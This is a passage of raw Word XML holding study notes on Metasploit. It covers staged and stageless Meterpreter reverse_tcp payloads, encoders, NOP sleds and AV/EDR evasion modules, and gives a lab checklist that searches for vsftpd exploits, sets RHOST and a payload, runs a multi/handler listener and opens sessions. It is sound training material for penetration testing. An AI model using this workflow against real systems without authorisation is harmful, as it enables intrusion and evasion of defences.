        <w:t>7. Additional Notes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D125C4C" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Staged payloads send a small stager first, then the main payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646B93F1" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Stageless payloads contain the entire payload in one stage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E177792" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Encoders are mainly for avoiding bad characters, not guaranteed AV bypass.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3552C88C" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• NOPs create safe instruction padding.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E478A7" w14:textId="77777777" w:rsidR="008646CA" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Evasion modules can help bypass some detection mechanisms, but success varies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39ABBCF7" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Staged vs </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Stageless</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (short)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7D218E" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Staged</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> (windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">): small </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>stager</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> runs first, connects back, then downloads the larger stage (Meterpreter). Good when exploit space is tiny.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377D058D" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Stageless</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> (windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>meterpreter_reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> style naming with underscore historically) = single file with everything </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>included;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> larger but doesn’t need a second connection. Choose based on reliability vs stealth/size tradeoffs. </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.rapid7.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId7" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>rapid7.github.io</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="524AB834" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6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cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:pict w14:anchorId="244E331C">
          <v:rect id="_x0000_i1043" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="178995C2" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Encoders, NOPs, and Evasion — practical note</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1442F86A" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Encoders</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: used to remove bad characters (null bytes, newline) or change byte patterns. They’re handy for exploit constraints, but </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>don’t</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> assume they’re a robust AV bypass. </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.metasploit.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId9" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>Rapid7</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6840B22D" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>NOPs</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: used for buffer-overflow style exploits to create NOP sleds and alignment padding. </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.metasploit.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="150066FB" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Evasion modules/options</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: Metasploit added an evasion type to help craft binaries/payloads that try to evade AV/EDR. Use them carefully and only in authorized lab testing; AV evasion is arms-race territory and not guaranteed. </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tgtFrame="_blank" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.metasploit.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId12" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>Hackers</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t xml:space="preserve"> Arise</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B7B5D9C" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6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cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:pict w14:anchorId="670B750A">
          <v:rect id="_x0000_i1044" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C30CE0" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Quick checklist (safe lab procedure)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D1DA19" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.rapid7.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="74A8BA0F" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">search </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>type:exploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or search </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">). Pick the right module. </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:tgtFrame="_blank" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>OffSec</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07F6CE82" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">use &lt;module&gt; → show options → set RHOST / RPORT / payload. </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>rapid7.github.io</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="225D0AD9" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">If you built a payload with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, prepare the handler: use exploit/multi/handler → set payload/LHOST/LPORT → run. Always start the handler/listener before running the payload on the target in a reverse scenario. </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:tgtFrame="_blank" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>GitHub</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId17" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>AdFoster</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6675F475" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>After a session is created, look at sessions/session -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;id&gt; and then you can use post modules or Meterpreter commands. </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:tgtFrame="_blank" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>OffSec</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="56300D3C" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6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rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:pict w14:anchorId="3D95DF7E">
          <v:rect id="_x0000_i1045" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C78A3BF" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Where to read more (official docs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2E8DEA" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Metasploit docs &amp; getting started: Rapid7 / Metasploit docs. </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.rapid7.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:hyperlink r:id="rId20" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.metasploit.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1406EDFA" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Metasploit modules reference (encoders / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>nops</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> / evasion counts &amp; descriptions): modules page. </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00F42DE6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:t>docs.metasploit.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="68E44A7D" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
